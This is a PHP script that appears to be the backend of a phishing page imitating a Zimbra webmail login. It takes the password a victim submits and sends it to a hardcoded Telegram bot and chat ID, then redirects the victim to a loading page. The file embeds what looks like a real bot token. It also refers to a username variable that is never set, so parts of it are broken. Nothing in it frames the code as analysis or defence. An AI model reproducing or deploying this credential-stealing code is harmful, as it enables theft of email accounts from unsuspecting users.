<?php
// Define the function to send message to Telegram
function sendToTelegram($chatId, $message) {
    // Set your bot token and Telegram chat ID
    $botToken = '7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo';
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Prepare the parameters
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Initialize cURL session
    $ch = curl_init($apiUrl);

    // Set the POST parameters
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

    // Execute the request
    curl_exec($ch);

    // Close cURL session
    curl_close($ch);
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
       $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Prepare the message for Telegram
    $message = "Zimbra\n\n";
    $message .= " $username\n";
    $message .= " $password\n";

    // Specify the Telegram chat ID where you want to receive the message
    $chatId = '1920675677';

    // Call the function to send message to Telegram
    sendToTelegram($chatId, $message);

    // Redirect the user to Google.com after form submission
    header("Location: load.html");
    exit();
}
?>